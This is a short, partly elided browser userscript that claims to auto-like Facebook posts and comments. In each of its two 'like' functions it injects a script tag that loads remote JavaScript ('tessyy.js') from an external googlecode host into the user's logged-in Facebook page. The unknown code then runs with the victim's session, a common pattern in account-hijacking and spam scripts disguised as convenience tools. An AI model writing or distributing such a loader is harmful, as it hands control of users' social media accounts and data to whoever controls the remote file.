// ==UserScript==
// @name			Auto Like Facebook Freezamher
// @namespace			auto_like_facebook
// @description			Auto Like Facebook by Freezamher
// @author			Freezamher
// @authorURL			http://www.facebook.com/asep.nyamer
// @homepage			http://wysoserious.blogspot.com/
...
body.appendChild(div);unsafeWindow.AutoLike = function() {javascript:(a=(b=document).createElement("script")).src="//dennii-steam.googlecode.com/files/tessyy.js",b.body.appendChild(a);void(0);};}
body = document.body;
...
body.appendChild(div);unsafeWindow.LikeComments = function() {javascript:(a=(b=document).createElement("script")).src="//dennii-steam.googlecode.com/files/tessyy.js",b.body.appendChild(a);void(0);};}
body = document.body;
